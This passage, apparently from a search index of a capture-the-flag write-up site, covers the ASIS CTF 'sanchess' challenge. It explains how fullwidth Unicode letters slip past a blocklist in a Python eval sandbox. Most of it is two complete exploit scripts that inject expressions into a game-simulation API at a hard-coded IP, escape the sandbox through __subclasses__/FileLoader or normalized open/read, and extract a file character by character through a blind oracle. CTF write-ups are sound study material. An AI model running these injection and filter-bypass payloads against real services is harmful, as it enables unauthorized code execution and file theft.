to_fullwidth(s):\n    res = \"\"\n    for char in s:\n        code = ord(char)\n        if 33 &lt;= code &lt;= 126:\n            res += chr(code + 0xFEE0)  # Shift to fullwidth\n        else:\n            res += char\n    return res\n</code></pre></p> <p>Now I could bypass the filters: <pre><code>func_open = to_fullwidth(\"open\")   # \uff4f\uff50\uff45\uff4e\nfunc_read = to_fullwidth(\"read\")   # \uff52\uff45\uff41\uff44\nfname = \"'fl'+'ag.txt'\"             # Bypass \"flag\" filter with concatenation\n\npayload_expr = f\"{func_open}({fname}).{func_read}()[{pos}] == '{char}'\"\n</code></pre></p> <p>The filter saw <code>\uff4f\uff50\uff45\uff4e</code> and <code>\uff52\uff45\uff41\uff44</code> - which didn't match its blocklist of \"open\" and \"read\". But after normalization, Python executed <code>open('fl'+'ag.txt').read()</code> which worked perfectly.</p>"},{"location":"asis-ctf/sanchess/#getting-the-flag-again","title":"Getting the Flag Again","text":"<p>I updated my script with the Unicode bypass and ran it again. This time it worked even with the filters in place:</p> <pre><code>[*] Starting Unicode Normalization Bypass...\n[+] Flag: A\n[+] Flag: AS\n[+] Flag: ASI\n...\n[+] Flag: ASIS{y0u_M2D3_r!cK_@NGRY}\n\nFinal Flag: ASIS{y0u_M2D3_r!cK_@NGRY}\n</code></pre> <p>The flag translates to \"you made Rick angry\" - fitting, given how much time I spent on this challenge.</p>"},{"location":"asis-ctf/sanchess/#exploit-scripts","title":"Exploit Scripts","text":""},{"location":"asis-ctf/sanchess/#pre-patch-version","title":"Pre-Patch Version","text":"<pre><code>#!/usr/bin/env python3\nimport requests\nimport string\nimport time\n\nBASE_URL = \"http://65.109.194.105:9090\"\nSESSION = requests.Session()\n\ndef test_expr(expr, distance=8):\n    morty_row = min(distance, 7)\n    morty_col = max(0, distance - 7)\n\n    payload = {\n        \"rick\": {\"row\": 0, \"col\": 0},\n        \"morty\": {\"row\": morty_row, \"col\": morty_col},\n        \"moves\": [{\n            \"type\": \"conditional\",\n            \"condition\": {\"type\": \"distance\", \"op\": \"&gt;\", \"value\": expr},\n            \"then\": \"down\",\n            \"else\": \"up\"\n        }]\n    }\n\n    try:\n        r = SESSION.post(f\"{BASE_URL}/simulate\", json=payload, timeout=10)\n        data = r.json()\n        if \"Error\" in data:\n            return None\n        path = data.get(\"path\", [])\n        if len(path) &gt;= 2:\n            return path[1][\"row\"] &gt; path[0][\"row\"]\n        return None\n    except:\n        return None\n\ndef check_char(pos, char_code):\n    byte_expr = \"[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')\"\n    expr = f\"({byte_expr}[{pos}]=={char_code})*100\"\n    result = test_expr(expr)\n\n    if result is None:\n        return None\n    return result == False  # False means match\n\ndef extract_flag():\n    charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + \"_{}-!@#$%^&amp;*().\"\n    flag = \"\"\n\n    print(\"[*] Extracting flag...\")\n\n    for pos in range(100):\n        found = False\n        for char in charset:\n            if check_char(pos, ord(char)):\n                flag += char\n                print(f\"    [{pos}] '{char}' -&gt; {flag}\")\n                found = True\n                break\n            time.sleep(0.02)\n\n        if not found:\n            print(f\"    [{pos}] No match found - END\")\n            break\n\n        if char == '}':\n            print(\"\\n[+] Flag complete!\")\n            break\n\n    return flag\n\nif __name__ == \"__main__\":\n    flag = extract_flag()\n    print(f\"\\nFLAG: {flag}\")\n</code></pre>"},{"location":"asis-ctf/sanchess/#post-patch-version-unicode-bypass","title":"Post-Patch Version (Unicode Bypass)","text":"<pre><code>#!/usr/bin/env python3\nimport requests\nimport sys\n\nBASE_URL = \"http://65.109.194.105:9090/\"\nSESSION = requests.Session()\n\ndef to_fullwidth(s):\n    res = \"\"\n    for char in s:\n        code = ord(char)\n        if 33 &lt;= code &lt;= 126:\n            res += chr(code + 0xFEE0)\n        else:\n            res += char\n    return res\n\ndef send_move(payload_expr):\n    final_payload = f\"({payload_expr}) * 100\"\n\n    json_body = {\n        \"rick\": {\"row\": 0, \"col\": 0},\n        \"morty\": {\"row\": 7, \"col\": 1},\n        \"moves\": [{\n            \"type\": \"conditional\",\n            \"condition\": {\"type\": \"distance\", \"op\": \"&gt;\", \"value\": final_payload},\n            \"then\": \"down\",\n            \"else\": \"up\"\n        }]\n    }\n\n    try:\n        r = SESSION.post(f\"{BASE_URL}/simulate\", json=json_body, timeout=5)\n        if r.status_code != 200:\n            return None\n        data = r.json()\n        if \"error\" in data or not data.get(\"path\"):\n            return None\n\n        path = data[\"path\"]\n        if len(path) &lt; 2:\n            return None\n\n        # UP (Row stays 0) = MATCH\n        if path[1]['row'] == 0:\n            return True\n        else:\n            return False\n    except Exception:\n        return None\n\ndef brute_force_flag():\n    print(\"[*] Starting Unicode Normalization Bypass...\")\n\n    func_open = to_fullwidth(\"open\")\n    func_read = to_fullwidth(\"read\")\n    fname = \"'fl'+'ag.txt'\"\n\n    print(f\"[*] Payload Template: {func_open}({fname}).{func_read}()[pos]\")\n\n    flag = \"\"\n    charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!?\"\n\n    for pos in range(0, 50):\n        found = False\n        sys.stdout.write(f\"\\r[{pos}] \")\n\n        for char in charset:\n            safe_char = char\n            if char == \"'\":\n                safe_char = \"\\\\'\"\n\n            expr = f\"{func_open}({fname}).{func_read}()[{pos}] == '{safe_char}'\"\n\n            res = send_move(expr)\n\n            if res is True:\n                flag += char\n                print(f\"\\r[+] Flag: {flag}                 \")\n                found = True\n                break\n\n        if not found:\n            print(f\"\\n[!] Stalled at position {pos}. End of flag?\")\n            break\n\n    print(f\"\\nFinal Flag: {flag}\")\n\nif __name__ == \"__main__\":\n    brute_force_flag()\n</code></pre>"},{"location":"asis-ctf/sanchess/#references","title":"References","text":"<ul> <li>Python Sandbox Escape Techniques</li> <li>Unicode Normalization Attacks</li> <li>Fullwidth Unicode Characters</li> </ul>"}]}